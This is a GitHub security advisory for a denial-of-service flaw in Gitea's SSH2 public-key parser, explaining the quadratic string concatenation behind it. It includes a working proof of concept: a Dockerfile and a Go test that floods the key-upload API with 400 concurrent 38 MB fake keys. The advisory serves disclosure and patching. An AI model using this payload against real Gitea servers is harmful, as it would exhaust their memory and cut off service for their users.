# [M] Gitea SSH Key Parser Denial of Service

## Summary
Severity: Medium
Advisory: GHSA-4xjf-493q-98p3
CVE: CVE-2026-56657
CWE: CWE-400
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-07-21
Source: https://github.com/advisories/GHSA-4xjf-493q-98p3
Type: github-advisory

## Affected
- Go: `code.gitea.io/gitea` — affected >=0 <1.27.0

## Details
Gitea's SSH key ingestion endpoint accepts keys in RFC 4716 (SSH2) format and normalises them before storage. The normalisation function contains an O(N²) string concatenation loop with no input size limit, meaning a single malicious key submission can force the server to perform an amount of work that grows quadratically with the size of the input. Any authenticated user can exploit this to exhaust the server's CPU and memory, taking the instance offline.

### Root Cause

An attacker sends a POST /api/v1/user/keys request with a Bearer token and a JSON body whose key field contains a malicious RFC 4716 (SSH2) public key. The key consists of a valid SSH2 header followed by a very large number of short content lines — for example, 400,000 lines of 100 characters each (~38 MB total).

The request reaches `CreateUserPublicKey` with no prior size check:

https://github.com/go-gitea/gitea/blob/9155a81b9daf1d46b2380aa91271e623ac947c1e/routers/api/v1/user/key.go#L201-L212

This calls `CheckPublicKeyString` which immediately calls `parseKeyString`. Inside `parseKeyString`, the SSH2 branch splits the input on newlines and accumulates the key body one line at a time using `keyContent += line`:

https://github.com/go-gitea/gitea/blob/9155a81b9daf1d46b2380aa91271e623ac947c1e/models/asymkey/ssh_key_parse.go#L60-L79

Because Go strings are immutable, each `+=` at line 77 allocates a new backing array and copies the entire accumulated string into it. For N lines the total bytes copied is `N*(N+1)/2`, making the operation `O(N²)` in both time and allocations. The validity of the key is only checked after the loop completes, so the entire quadratic work is performed regardless of whether the input is a real SSH key.

This is only possible because neither the web form field nor the API struct carries a size constraint:

https://github.com/go-gitea/gitea/blob/9155a81b9daf1d46b2380aa91271e623ac947c1e/services/forms/user_form.go#L308-L317

https://github.com/go-gitea/gitea/blob/9155a81b9daf1d46b2380aa91271e623ac947c1e/modules/structs/repo_key.go#L33-L49

### PoC

To reproduce, clone gitea and checkout commit `9155a81b9daf1d46b2380aa91271e623ac947c1e`. Then create the following files from the gitea root directory:

`poc/Dockerfile`
```docker
FROM golang:1.26-alpine AS builder

RUN apk add --no-cache git build-base

WORKDIR /gitea

# Download deps in a separate layer so rebuilds are fast after source changes.
COPY go.mod go.sum ./
RUN go mod download

# Copy full source (needed for fixtures, config templates, and compilation).
COPY . .

# Compile the integration test binary.
# modernc sqlite (pure Go, no CGO needed) is the default driver.
RUN CGO_ENABLED=0 go test -c \
      -o /integration.test \
      gitea.dev/tests/integration

# ── runtime image ────────────────────────────────────────────────────────────
FROM alpine:3.22

# git is required at runtime: the test framework initialises git repos.
RUN apk add --no-cache git

COPY --from=builder /integration.test /integration.test
# Keep the full source at /gitea so runtime.Caller(0) path resolution works
# and fixtures / config templates are accessible.
COPY --from=builder /gitea /gitea

RUN adduser -D -u 1000 poc && chown -R poc:poc /gitea

WORKDIR /gitea

USER poc

ENTRYPOINT ["/integration.test", \
            "-test.run", "TestDoSSSHKeyParserOOM", \
            "-test.v", \
            "-test.timeout", "600s"]
```

`tests/integration/poc_dos_test.go`
```go
package integration

import (
	"fmt"
	"runtime"
	"runtime/debug"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	auth_model "gitea.dev/models/auth"
	api "gitea.dev/modules/structs"
	"gitea.dev/tests"
)

func TestDoSSSHKeyParserOOM(t *testing.T) {
	defer tests.PrepareTestEnv(t)()

	// Raise the GC trigger so intermediate strings accumulate faster,
	// matching realistic server behaviour under sustained allocation load.
	debug.SetGCPercent(400)

	// Log in as an ordinary user — no special privileges needed.
	session := loginUser(t, "user1")
	token := getTokenForLoggedInUser(t, session, auth_model.AccessTokenScopeWriteUser)

	const (
		numLines     = 400_000
		charsPerLine = 100
		numWorkers   = 400
	)

	var sb strings.Builder
	sb.WriteString("---- BEGIN SSH2 PUBLIC KEY ----\n")
	sb.WriteString("Comment: dos\n")
	line := strings.Repeat("a", charsPerLine) + "\n"
	for i := 0; i < numLines; i++ {
		sb.WriteString(line)
	}
	sb.WriteString("---- END SSH2 PUBLIC KEY ----\n")
	payload := sb.String()

	peakGB := float64(numWorkers) * 2 * float64(numLines) * float64(charsPerLine) / (1 << 30)
	t.Logf("payload=%.1f MB  workers=%d  peak_theory=%.1f GB",
		float64(len(payload))/(1<<20), numWorkers, peakGB)

	// Each goroutine marshals its own JSON body. The bytes live in req.Body
	// for the entire duration of MakeRequest, so numWorkers concurrent
	// goroutines hold numWorkers × payload_size bytes simultaneously.
	// With numWorkers=400 and payload=38.5 MB: 400 × 38.5 MB = 15.4 GB → OOM.
	var (
		wg    sync.WaitGroup
		done  atomic.Int64
		ready = make(chan struct{})
		start = time.Now()
	)

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func(id int) {
			defer func() { done.Add(1); wg.Done() }()
			<-ready

			req := NewRequestWithJSON(t, "POST", "/api/v1/user/keys", api.CreateKeyOption{
				Title: fmt.Sprintf("dos-%d", id),
				Key:   payload,
			}).AddTokenAuth(token)

			MakeRequest(t, req, NoExpectedStatus)
		}(i)
	}

	go func() {
		var ms runtime.MemStats
		ticker := time.NewTicker(5 * time.Second)
		defer ticker.Stop()
		for range ticker.C {
			runtime.ReadMemStats(&ms)
			t.Logf("[%4.0fs] done=%d/%d  HeapSys=%.1f GB  HeapAlloc=%.1f GB",
				time.Since(start).Seconds(), done.Load(), numWorkers,
				float64(ms.HeapSys)/(1<<30), float64(ms.HeapAlloc)/(1<<30))
		}
	}()

	close(ready)
	wg.Wait()
	t.Logf("all done in %.1fs — container survived, increase numWorkers or numLines",
		time.Since(start).Seconds())
}
```

When you run the Dockerfile, it should OOM, however this is highly dependent on the host machine. On my end, I do the following:

```sh
docker build -t gitea-dos-poc -f poc/Dockerfile .
docker run --rm --memory=12g --memory-swap=12g gitea-dos-poc
```

Which prints out:
```
=== TestDoSSSHKeyParserOOM (tests/integration/poc_dos_test.go:35)
    testlogger.go:62: 2026/06/02 14:37:40 modules/storage/local.go:48:NewLocalStorage() [I] Creating new Local Storage at /gitea/tests/gitea-lfs-meta
    testlogger.go:62: 2026/06/02 14:37:40 HTTPRequest [I] router: completed POST /user/login for test-mock:12345, 303 See Other in 29.9ms @ auth/auth.go:284(auth.SignInPost)
    testlogger.go:62: 2026/06/02 14:37:41 HTTPRequest [I] router: completed POST /user/settings/applications for test-mock:12345, 303 See Other in 17.8ms @ setting/applications.go:36(setting.ApplicationsPost)
    poc_dos_test.go:62: payload=38.5 MB  workers=400  peak_theory=29.8 GB
```

... demonstrating high memory consumption. On my end, memory is consumed within 1 second.

## References
- https://github.com/go-gitea/gitea/security/advisories/GHSA-4xjf-493q-98p3
- https://github.com/go-gitea/gitea
- https://github.com/go-gitea/gitea/releases/tag/v1.27.0
